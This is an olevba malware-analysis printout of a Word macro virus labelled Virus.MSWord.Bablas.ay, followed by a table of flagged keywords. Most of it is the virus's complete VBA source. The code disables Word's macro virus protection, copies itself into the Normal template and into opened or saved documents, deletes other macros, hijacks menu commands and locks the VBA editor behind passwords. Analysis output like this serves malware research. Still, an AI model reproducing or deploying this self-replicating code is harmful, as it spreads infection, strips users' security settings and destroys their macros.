olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ay-4522420db832afee5ebaadd4246b9ea9b74dc85f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ay-4522420db832afee5ebaadd4246b9ea9b74dc85f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SANTO.bas 
in file: Virus.MSWord.Bablas.ay-4522420db832afee5ebaadd4246b9ea9b74dc85f - OLE stream: 'Macros/VBA/SANTO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Andai saja dia tahu gue sayang banget ama dia (Aries)
'mungkin gue 'nggak bakalan buat program kayak gini
'yang mungkin nyebelin
'salam manis dari Iiq

Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Maafin gue..mungkin lo sadar bahwa gue amat sayang ame lo" & Chr(34) & _
    "makasich" & Chr(34) & "," & Chr(13) & "moga aza lo-lo pade tao gitchu..." & Chr(13) & _
    "sekarang bukan waktunya bingung, pokoke terusin azech." & Chr(13) & _
    "Sekali lagi gue ucapin muakasich buanget!." & Chr(13) & Chr(13) & "salam dari..: SANTO ANTHONIUS." & _
    Chr(13) & "(buat temen-temen, ma'af mengganggu.)", vbOKOnly + vbExclamation, "Broken Hate : IIQ")
    End If
End Sub

Sub Terobos()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    If InputBox("Masukin Kata Sandinya..!", "Santo Anthonius ") = "IIQ NU KASEP THEA" Then Application.ShowVisualBasicEditor = True
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Ochang Euy..." & Chr(13) & Chr(13) & _
    "Gue enggak mao komputer gue ERROR, but maapin gue", vbOKOnly + vbExclamation, "Santo Anthonius ")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Terobos
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Santo Anthonius Macros telah aktif di file anda "
    ActiveWindow.Caption = "(maapin santo)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Santo Anthonius ") = "*ArrA*" Then Application.ShowVisualBasicEditor = True
End Sub

Sub TimpahDokumen()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "SANTO" Then DocOk = True
        If Obj.Name <> "SANTO" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying Santo Anthonius  From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="SANTO", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub TimpahTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "SANTO" Then NorOk = True
        If Obj.Name <> "SANTO" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying Santo Anthonius  From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="SANTO", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        TimpahDokumen
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Terobos
    ChangeCap
    TimpahTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    TimpahDokumen
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        TimpahDokumen
        TimpahTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Musnahkan()
    c = Documents.Count
    If c <> 0 Then
        Normal.SANTO.TimpahDokumen
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.SANTO.Musnahkan"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Terobos
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.SANTO.Musnahkan"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
